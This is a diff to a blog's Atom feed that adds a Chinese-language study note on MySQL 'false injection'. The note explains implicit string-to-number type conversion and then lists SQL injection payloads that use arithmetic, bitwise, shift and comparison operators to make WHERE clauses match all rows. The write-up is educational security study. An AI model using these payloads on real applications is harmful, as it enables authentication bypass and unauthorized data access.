@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://alisitaweb.github.io/"/>
-  <updated>2017-09-05T09:02:39.457Z</updated>
+  <updated>2017-09-06T13:45:39.823Z</updated>
   <id>https://alisitaweb.github.io/</id>
   
   <author>
@@ -14,6 +14,56 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>MySQL False 注入姿势学习</title>
+    <link href="https://alisitaweb.github.io/2017/09/06/MySQL-False%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
+    <id>https://alisitaweb.github.io/2017/09/06/MySQL-False注入姿势学习/</id>
+    <published>2017-09-06T13:43:32.552Z</published>
+    <updated>2017-09-06T13:45:39.823Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="http://bobao.360.cn/learning/detail/3804.html" target="_blank" rel="external">原文链接</a></p>
+<h3 id="0x01-False-Injection"><a href="#0x01-False-Injection" class="headerlink" title="0x01 False Injection"></a>0x01 False Injection</h3><p>首先是看了文章之后知道了一个MySQL的特性<br>    <code>select * from user where username=0;</code><br>    <img src="./images/1.png" alt="enter description here" title="1"></p>
+<p>这条语句指向之后会返回所有值</p>
+<p>   <code>select * from users where password=0;</code><br>   <img src="./images/2.png" alt="enter description here" title="2"></p>
+<p> 这里涉及到了MySQL的隐式类型转换</p>
+<p>  官方文档是这样写的：<br>      <em>The following rules describe how conversion occurs for comparison operations:</em></p>
+<p><em>If one or both arguments are NULL, the result of the comparison is NULL, except for the NULL-safe &lt;=&gt; equality comparison operator. For NULL &lt;=&gt; NULL, the result is true. No conversion is needed.</em></p>
+<p><em>If both arguments in a comparison operation are strings, they are compared as strings.</em></p>
+<p><em>If both arguments are integers, they are compared as integers.</em></p>
+<p><em>Hexadecimal values are treated as binary strings if not compared to a number.</em></p>
+<p><em>If one of the arguments is a TIMESTAMP or DATETIME column and the other argument is a constant, the constant is converted to a timestamp before the comparison is performed. This is done to be more ODBC-friendly. Note that this is not done for the arguments to IN()! To be safe, always use complete datetime, date, or time strings when doing comparisons. For example, to achieve best results when using BETWEEN with date or time values, use CAST() to explicitly convert the values to the desired data type.</em></p>
+<p><em>If one of the arguments is a decimal value, comparison depends on the other argument. The arguments are compared as decimal values if the other argument is a decimal or integer value, or as floating-point values if the other argument is a floating-point value.</em></p>
+<p><em>In all other cases, the arguments are compared as floating-point (real) numbers</em></p>
+<hr>
+<p>大概意思就是：<br>    如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;=&gt;NULL 会返回1。不做类型转换</p>
+<p>   两个参数都是字符串，按照字符串比较。不做类型转换</p>
+<p>   两个参数都是整数，按照整数比较。不做类型转换</p>
+<p>   如果不与数字进行比较，则将十六进制值视为二进制字符串。</p>
+<p>   有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳</p>
+<p>   有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</p>
+<p>   所有其他情况下，两个参数都会被转换为浮点数再进行比较</p>
+<p>最重要的是下面这句话，这是利用点：<br>    <strong>字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</strong></p>
+<p>那么，将字符串转换的时候会产生一个warning，转换的结果为0，但是如果字符串的开头是数字的时候会从数字部分截断，转换为数字，所以上面为什么会返回所有值就可以理解了。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><code>where username=&#39;&#39;+&#39;&#39;;</code><br><code>where username=&#39;&#39;-&#39;&#39;;</code><br><code>where username=&#39;&#39;*&#39;&#39;;</code><br><code>where username=&#39;&#39;/6;</code><br><code>where username=&#39;&#39;%1;</code><br><code>where username=&#39;&#39;&amp;0;</code><br><code>where username=&#39;&#39;|0;</code><br><code>where username=&#39;&#39;^0;</code></p>
+<h6 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h6><p><code>&lt;&lt;0# &#39;&gt;&gt;0</code></p>
+<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p><code>where username=&#39;&#39;=0&lt;=&gt;1;</code><br><code>where username=&#39;&#39;=0&lt;&gt;0;</code><br><code>where username=&#39;&#39;&gt;-1;</code></p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><code>&#39;+1 is not null#  &#39;in(-1,1)#  &#39;not in(1,0)#  &#39;like 1#  &#39;REGEXP 1#  &#39;BETWEEN 1 AND 1#  &#39;div 1#  &#39;xor 1#  &#39;=round(0,1)=&#39;1  &#39;&lt;&gt;ifnull(1,2)=&#39;1</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;http://bobao.360.cn/learning/detail/3804.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;0x01-False-Injection&quot;&gt;&lt;a href
+    
+    </summary>
+    
+      <category term="SQL Injection" scheme="https://alisitaweb.github.io/categories/SQL-Injection/"/>
+    
+    
+      <category term="MySQL,SQLInjection,False" scheme="https://alisitaweb.github.io/tags/MySQL-SQLInjection-False/"/>
+    
+  </entry>
   
   <entry>
     <title>new article</title>
